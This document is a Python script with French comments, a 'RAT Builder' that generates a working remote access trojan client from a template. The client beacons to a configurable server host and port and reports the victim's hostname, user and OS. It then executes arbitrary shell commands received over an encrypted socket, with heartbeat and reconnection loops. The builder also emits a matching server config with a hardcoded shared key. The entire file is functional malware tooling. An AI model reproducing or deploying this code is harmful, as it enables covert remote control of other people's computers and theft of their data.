import os
import shutil
import base64
import sys

# ajoute le dossier parent au path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from cryptography.fernet import Fernet

class RatBuilder:
    def __init__(self):
        self.template_dir = "../client"
        self.output_dir = "./output"
        
    def build_client(self, server_host, server_port, output_name="client.py"):
        # genere un client configure
        print(f"[*] Building RAT client...")
        print(f"    Server: {server_host}:{server_port}")
        
        # cree le dossier de sortie
        os.makedirs(self.output_dir, exist_ok=True)
        
        # genere une nouvelle cle de chiffrement OU utilise celle par defaut
        # Pour les tests, on utilise la cle par defaut du serveur
        key = b'ZmDfcTF7_60GrrY167zsiPd67pEvs0aGOv2oasOM1Pg='  # cle par defaut du serveur
        print(f"[*] Using default encryption key for compatibility")
        
        # genere le code client
        client_code = self._generate_client_code(server_host, server_port, key, output_name)
        
        # sauvegarde le client
        output_path = os.path.join(self.output_dir, output_name)
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(client_code)
            
        print(f"[+] Client built: {output_path}")
        
        # copie les modules necessaires
        self._copy_modules()
        
        # genere le fichier de config pour le serveur
        self._generate_server_config(server_host, server_port, key)
        
        return output_path
        
    def _generate_client_code(self, server_host, server_port, encryption_key, filename):
        # genere le code du client avec la config
        key_str = encryption_key.decode() if isinstance(encryption_key, bytes) else encryption_key
        
        template = '''#!/usr/bin/env python3
# ''' + filename + '''
# Generated RAT Client
import socket
import time
import threading
import platform
import subprocess
import os
import base64
import getpass
import sys
import json
import struct
import hashlib
from cryptography.fernet import Fernet

# Configuration generee par le builder
SERVER_HOST = "''' + server_host + '''"
SERVER_PORT = ''' + str(server_port) + '''
ENCRYPTION_KEY = b"''' + key_str + '''"

print("[DEBUG] Starting client with key:", ENCRYPTION_KEY[:10], "...")

class Message:
    def __init__(self, cmd_type, data=None, status="ok"):
        self.type = cmd_type
        self.data = data or {}
        self.status = status
        
    def to_dict(self):
        return {
            "type": self.type,
            "data": self.data,
            "status": self.status
        }
        
    @classmethod
    def from_dict(cls, data):
        return cls(data["type"], data.get("data"), data.get("status", "ok"))

class Protocol:
    def __init__(self, cipher):
        self.cipher = cipher
        
    def pack_message(self, message):
        json_data = json.dumps(message.to_dict()).encode()
        encrypted = self.cipher.encrypt(json_data)
        size = struct.pack('!I', len(encrypted))
        return size + encrypted
        
    def unpack_message(self, data):
        try:
            decrypted = self.cipher.decrypt(data)
            json_data = json.loads(decrypted.decode())
            return Message.from_dict(json_data)
        except:
            return None
            
    def receive_full_message(self, sock):
        try:
            size_data = self._recv_exact(sock, 4)
            if not size_data:
                return None
            size = struct.unpack('!I', size_data)[0]
            message_data = self._recv_exact(sock, size)
            if not message_data:
                return None
            return self.unpack_message(message_data)
        except:
            return None
            
    def _recv_exact(self, sock, length):
        data = b''
        while len(data) < length:
            chunk = sock.recv(length - len(data))
            if not chunk:
                return None
            data += chunk
        return data

class SystemInfo:
    def get_system_info(self):
        try:
            return {
                "os": platform.system(),
                "os_version": platform.release(),
                "architecture": platform.machine(),
                "hostname": socket.gethostname(),
                "user": getpass.getuser(),
                "python_version": platform.python_version()
            }
        except:
            return {"os": "Unknown", "user": "Unknown", "hostname": "Unknown"}
    
    def execute_command(self, command):
        try:
            if platform.system().lower() == "windows":
                result = subprocess.run(["cmd", "/c", command], capture_output=True, text=True, timeout=30)
            else:
                result = subprocess.run(["/bin/bash", "-c", command], capture_output=True, text=True, timeout=30)
            output = result.stdout
            if result.stderr:
                output += "\\nErrors:\\n" + result.stderr
            return output if output else "Command executed (no output)"
        except subprocess.TimeoutExpired:
            return "Command timeout"
        except Exception as e:
            return f"Error executing command: {str(e)}"

class GeneratedRatClient:
    def __init__(self):
        self.host = SERVER_HOST
        self.port = SERVER_PORT
        self.cipher = Fernet(ENCRYPTION_KEY)
        self.protocol = Protocol(self.cipher)
        self.running = False
        self.sock = None
        self.sysinfo = SystemInfo()
        
    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            
            # envoie les infos du client
            client_info = self.sysinfo.get_system_info()
            initial_msg = Message("client_info", client_info)
            data = self.protocol.pack_message(initial_msg)
            self.sock.sendall(data)
            
            print(f"[+] Connecte a {self.host}:{self.port}")
            return True
        except Exception as e:
            print(f"[-] Erreur connexion: {e}")
            return False
    
    def start(self):
        if not self.connect():
            return
            
        self.running = True
        
        # thread pour heartbeat
        heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        
        print("[*] Client demarre")
        
        # boucle principale
        while self.running:
            try:
                message = self.protocol.receive_full_message(self.sock)
                if not message:
                    break
                    
                response = self.handle_command(message)
                if response:
                    response_data = self.protocol.pack_message(response)
                    self.sock.sendall(response_data)
                    
            except Exception as e:
                print(f"[-] Erreur: {e}")
                break
                
        self.disconnect()
    
    def handle_command(self, message):
        cmd_type = message.type
        args = message.data.get("args", [])
        
        try:
            if cmd_type == "help":
                help_text = "Commands: help, ipconfig, shell, screenshot (basic)"
                return Message("help", {"output": help_text})
            elif cmd_type == "shell":
                if not args:
                    return Message("shell", {"output": "No command specified"}, "error")
                cmd = " ".join(args)
                result = self.sysinfo.execute_command(cmd)
                return Message("shell", {"output": result})
            elif cmd_type == "ipconfig":
                if platform.system().lower() == "windows":
                    result = subprocess.run(["ipconfig"], capture_output=True, text=True, timeout=10)
                else:
                    result = subprocess.run(["ifconfig"], capture_output=True, text=True, timeout=10)
                output = result.stdout if result.returncode == 0 else "Failed to get network info"
                return Message("ipconfig", {"output": output})
            else:
                return Message(cmd_type, {"output": f"Command not implemented: {cmd_type}"}, "error")
        except Exception as e:
            return Message(cmd_type, {"output": f"Error: {str(e)}"}, "error")
    
    def _heartbeat_loop(self):
        while self.running:
            try:
                heartbeat = Message("heartbeat")
                data = self.protocol.pack_message(heartbeat)
                self.sock.sendall(data)
                time.sleep(30)
            except:
                break
                
    def disconnect(self):
        print("[*] Disconnecting...")
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except:
                pass

if __name__ == "__main__":
    client = GeneratedRatClient()
    
    # boucle de reconnexion
    max_retries = 5
    retry_count = 0
    
    while retry_count < max_retries:
        try:
            client.start()
            break
        except Exception as e:
            retry_count += 1
            print(f"[-] Echec connexion (tentative {retry_count}/{max_retries})")
            if retry_count < max_retries:
                time.sleep(10)
                client = GeneratedRatClient()  # nouvelle instance
                
    if retry_count >= max_retries:
        print("[-] Impossible de se connecter au serveur")
'''
        return template

    def _copy_modules(self):
        # copie les modules du client
        modules_src = os.path.join(self.template_dir, "modules")
        modules_dst = os.path.join(self.output_dir, "modules")
        
        if os.path.exists(modules_src):
            if os.path.exists(modules_dst):
                shutil.rmtree(modules_dst)
            shutil.copytree(modules_src, modules_dst)
            print("[+] Modules copied")
            
    def _generate_server_config(self, host, port, key):
        # genere la config pour le serveur
        config_content = f'''# Server Configuration
# Generated by RAT Builder

SERVER_HOST = "{host}"
SERVER_PORT = {port}
ENCRYPTION_KEY = b"{key.decode()}"

# Use this key in your server configuration
'''
        
        config_path = os.path.join(self.output_dir, "server_config.py")
        with open(config_path, "w") as f:
            f.write(config_content)
            
        print(f"[+] Server config generated: {config_path}")

def main():
    print("=== RAT Builder ===")
    
    builder = RatBuilder()
    
    # demande les parametres
    server_host = input("Server IP [127.0.0.1]: ").strip() or "127.0.0.1"
    server_port = input("Server Port [4444]: ").strip() or "4444"
    
    try:
        server_port = int(server_port)
    except ValueError:
        print("[-] Invalid port number")
        return
        
    output_name = input("Output filename [client.py]: ").strip() or "client.py"
    
    # genere le client
    try:
        output_path = builder.build_client(server_host, server_port, output_name)
        print("\n[+] Build completed successfully!")
        print(f"[*] Client file: {output_path}")
        print(f"[*] Modules directory: {os.path.join(builder.output_dir, 'modules')}")
        print(f"[*] Server config: {os.path.join(builder.output_dir, 'server_config.py')}")
        
    except Exception as e:
        print(f"[-] Build failed: {e}")

if __name__ == "__main__":
    main()